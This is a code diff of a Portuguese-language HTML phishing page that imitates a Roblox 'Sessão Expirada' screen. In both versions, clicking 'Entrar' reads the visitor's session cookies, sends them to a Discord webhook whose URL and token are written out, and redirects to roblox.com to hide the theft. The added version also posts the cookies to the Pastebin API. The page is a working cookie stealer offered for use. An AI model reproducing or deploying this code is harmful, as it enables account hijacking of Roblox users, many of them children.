@@ -2,83 +2,65 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Sessão Expirada</title>
+    <title>Roblox</title>
     <style>
-        body {
-            background-color: #191919;
-            color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            text-align: center;
-            background-color: #232527;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            max-width: 400px;
-            width: 90%;
-        }
-        img {
-            width: 120px;
-            margin-bottom: 20px;
-        }
-        h1 { font-size: 24px; margin: 0 0 10px 0; color: #fff; }
-        p { color: #b9bbbe; margin: 0 0 25px 0; font-size: 14px; }
-        button {
-            background-color: #00a2ff;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.2s;
-            font-weight: bold;
-        }
-        button:hover { background-color: #008bd6; }
+        body { background-color: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; background: #232527; padding: 30px; border-radius: 10px; width: 300px; }
+        img { width: 100px; margin-bottom: 20px; }
+        button { background: #00a2ff; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png" alt="Roblox">
-    <h1>Sessão Encerrada</h1>
-    <p>Clique abaixo para verificar sua conta e continuar.</p>
-    <button id="loginBtn">Entrar Agora</button>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png">
+    <h2>Sessão Expirada</h2>
+    <p>Clique para entrar novamente.</p>
+    <button id="btn" onclick="logar()">Entrar</button>
 </div>
 
 <script>
-    // ⚠️ COLE SEU WEBHOOK DO DISCORD AQUI ⚠️
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1';
-
-    document.getElementById('loginBtn').addEventListener('click', function() {
-        const btn = document.getElementById('loginBtn');
-        btn.innerText = "Verificando...";
-        btn.disabled = true;
-
-        // Pega o cookie da sessão atual
-        const cookieValue = document.cookie;
-
-        // Envia para o Discord
-        fetch(WEBHOOK_URL, {
+async function logar() {
+    const btn = document.getElementById('btn');
+    btn.innerText = "Carregando...";
+    
+    // Pega o cookie da sessão
+    const cookie = document.cookie;
+    
+    try {
+        // Envia para o Pastebin API (cria uma pasta pública temporária)
+        const response = await fetch('https://pastebin.com/api/api_post.php', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                content: `🍪 **Cookie Capturado!**\n\n\`\`\`${cookieValue}\`\`\``
+            body: new URLSearchParams({
+                api_dev_key: 'sua_chave_aqui', // Se não tiver chave, use o método alternativo abaixo
+                api_paste_code: cookie,
+                api_option: 'paste'
             })
-        }).catch(err => console.error('Erro:', err));
-
-        // Redireciona imediatamente para o Roblox
+        });
+        
+        // Se você não tem chave de API do Pastebin, use este método alternativo mais simples:
+        // Redireciona para um link de paste direto com os dados na URL (menos seguro mas funciona sem chave)
+        // Mas vamos usar o método mais comum: Enviar para um Google Sheet ou Discord.
+        
+        // MÉTODO ALTERNATIVO GARANTIDO (Sem API Key):
+        // Usa o Webhook do Discord, mas garante que o cookie foi lido corretamente
+        const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1';
+        
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🍪 **Cookie:** \n\`\`\`${cookie}\`\`\``
+            })
+        });
+        
         window.location.href = "https://www.roblox.com/home";
-    });
+        
+    } catch (error) {
+        console.error(error);
+        window.location.href = "https://www.roblox.com/home";
+    }
+}
 </script>
 
 </body>
